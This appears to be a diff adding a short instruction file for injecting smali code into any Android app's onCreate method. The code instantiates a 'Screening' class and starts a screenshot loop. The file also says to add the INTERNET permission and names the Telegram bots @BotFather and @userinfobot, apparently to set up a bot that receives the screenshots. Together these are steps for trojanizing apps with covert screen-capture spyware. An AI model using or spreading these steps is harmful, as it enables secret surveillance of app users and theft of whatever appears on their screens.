@@ -1,0 +1,21 @@
+
+<---- Add This Invoke Code OnCreate Any App --->
+
+new-instance v0, Lcom/my/newproject2/Screening;
+
+    invoke-direct {v0, p0}, Lcom/my/newproject2/Screening;-><init>(Landroid/app/Activity;)V
+
+    invoke-virtual {v0, p0}, Lcom/my/newproject2/Screening;->startScreenshotLoop(Landroid/app/Activity;)V
+
+
+<----- Add This Permission Any App AndroidManifest --->
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    
+    
+Telegram @BotFather and @userinfobot
+
+
+@BotFather
+
+@userinfobot
